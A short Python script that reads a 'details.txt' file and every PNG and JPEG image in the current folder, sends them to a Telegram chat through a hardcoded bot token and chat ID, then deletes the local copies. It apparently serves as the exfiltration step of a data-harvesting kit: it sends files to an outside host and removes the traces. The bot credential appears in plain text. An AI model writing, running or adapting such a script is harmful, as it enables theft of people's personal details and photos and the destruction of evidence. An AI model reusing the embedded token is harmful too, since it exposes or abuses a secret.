import os
import requests

# Telegram bot details
BOT_TOKEN = "7778145978:AAHeW_vFY937sBJ6edPh1KRRis0BpJFEnBQ"
CHAT_ID = "6663932533"  # Your chat ID

# Paths to the details file and current folder
DETAILS_FILE = "details.txt"
CURRENT_FOLDER = "."

def send_text_to_telegram(file_path, bot_token, chat_id):
    """Send the text content of a file to Telegram."""
    try:
        with open(file_path, 'r') as file:
            details_content = file.read()
        
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        payload = {
            "chat_id": chat_id,
            "text": f"Details:\n{details_content}"
        }
        response = requests.post(url, json=payload)
        response.raise_for_status()
        print("Details sent successfully.")
        return True
    except Exception as e:
        print(f"Error sending details: {e}")
        return False

def send_photos_to_telegram(folder, bot_token, chat_id):
    """Send all photos in a folder to Telegram."""
    success = True
    try:
        url = f"https://api.telegram.org/bot{bot_token}/sendPhoto"
        for file_name in os.listdir(folder):
            if file_name.lower().endswith(('.png', '.jpg', '.jpeg')):
                file_path = os.path.join(folder, file_name)
                with open(file_path, 'rb') as photo:
                    response = requests.post(
                        url,
                        data={"chat_id": chat_id},
                        files={"photo": photo}
                    )
                    response.raise_for_status()
                    print(f"Photo '{file_name}' sent successfully.")
    except Exception as e:
        print(f"Error sending photos: {e}")
        success = False
    return success

def delete_files(folder, details_file):
    """Delete all photos in the folder and the details file."""
    # Delete photos
    for file_name in os.listdir(folder):
        if file_name.lower().endswith(('.png', '.jpg', '.jpeg')):
            try:
                os.remove(os.path.join(folder, file_name))
                print(f"Deleted photo: {file_name}")
            except Exception as e:
                print(f"Error deleting photo '{file_name}': {e}")
    
    # Delete details file
    if os.path.exists(details_file):
        try:
            os.remove(details_file)
            print(f"Deleted details file: {details_file}")
        except Exception as e:
            print(f"Error deleting details file: {e}")

# Send details and photos
details_sent = False
photos_sent = False

if os.path.exists(DETAILS_FILE):
    details_sent = send_text_to_telegram(DETAILS_FILE, BOT_TOKEN, CHAT_ID)
else:
    print(f"{DETAILS_FILE} not found.")

photos_sent = send_photos_to_telegram(CURRENT_FOLDER, BOT_TOKEN, CHAT_ID)

# Delete files if both were sent successfully
if details_sent and photos_sent:
    delete_files(CURRENT_FOLDER, DETAILS_FILE)
else:
    print("Files not deleted due to errors in sending.")
